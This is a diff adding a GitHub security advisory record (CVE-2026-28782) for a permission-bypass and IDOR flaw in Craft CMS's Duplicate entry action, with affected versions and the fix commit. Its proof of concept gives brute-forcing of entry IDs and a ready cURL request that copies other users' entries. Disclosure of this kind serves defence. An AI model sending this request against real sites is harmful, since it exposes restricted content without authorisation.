@@ -1,0 +1,84 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-jxm3-pmm2-9gf6",
+  "modified": "2026-03-04T18:39:08Z",
+  "published": "2026-03-03T21:05:12Z",
+  "aliases": [
+    "CVE-2026-28782"
+  ],
+  "summary": "Craft CMS has Permission Bypass and IDOR in Duplicate Entry Action",
+  "details": "## Description\nThe \"Duplicate\" entry action does not properly verify if the user has permission to perform this action on the specific target elements.\nEven with only \"View Entries\" permission (where the \"Duplicate\" action is restricted in the UI), a user can bypass this restriction by sending a direct request.\n\nFurthermore, this vulnerability allows duplicating **other users' entries** by specifying their Entry IDs. Since Entry IDs are incremental, an attacker can trivially brute-force these IDs to duplicate and access restricted content across the system.\n\n## Proof of Concept\n### Prerequisites\n- A user with \"View Entries\" permission on any section.\n\n### Steps to Reproduce\n1. Log in as a user with minimal permissions (\"View Entries\").\n1. Identify the target Entry ID (e.g., via brute-force `1` to `N`).\n1. Send the following cURL request:\n   > Replace `craft.local`, `<Cookie>`, `<CSRF>` and `6393` (which is the entry ID):\n   ```bash\n   curl --path-as-is -i -s -k -X $'POST' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0' -H $'Accept: application/json' -H $'Content-Type: application/json' -H $'X-CSRF-Token: <CSRF>' -H $'Content-Length: 216' -b $'<Cookie>' --data-binary $'{\\\"context\\\":\\\"index\\\",\\\"elementType\\\":\\\"craft\\\\\\\\elements\\\\\\\\Entry\\\",\\\"source\\\":\\\"section:17da21e5-0cfe-41f5-8cd2-450a94f7989c\\\",\\\"viewState\\\":{\\\"static\\\":true},\\\"elementAction\\\":\\\"craft\\\\\\\\elements\\\\\\\\actions\\\\\\\\Duplicate\\\",\\\"elementIds\\\":[6393]}' $'http://craft.local/index.php?p=admin%2Factions%2Felement-indexes%2Fperform-action'\n   ```\n1. Observe that a new entry is created with the attacker as the owner, granting full access to the content.\n\n## Resources\n\nhttps://github.com/craftcms/cms/commit/fb61a91357f5761c852400185ba931f51d82783d",
+  "severity": [
+    {
+      "type": "CVSS_V4",
+      "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N/E:P"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Packagist",
+        "name": "craftcms/cms"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "5.0.0-RC1"
+            },
+            {
+              "fixed": "5.9.0-beta.1"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "package": {
+        "ecosystem": "Packagist",
+        "name": "craftcms/cms"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "4.0.0-RC1"
+            },
+            {
+              "fixed": "4.17.0-beta.1"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/craftcms/cms/security/advisories/GHSA-jxm3-pmm2-9gf6"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-28782"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/craftcms/cms/commit/fb61a91357f5761c852400185ba931f51d82783d"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/craftcms/cms"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-639"
+    ],
+    "severity": "MODERATE",
+    "github_reviewed": true,
+    "github_reviewed_at": "2026-03-03T21:05:12Z",
+    "nvd_published_at": "2026-03-04T17:16:21Z"
+  }
+}
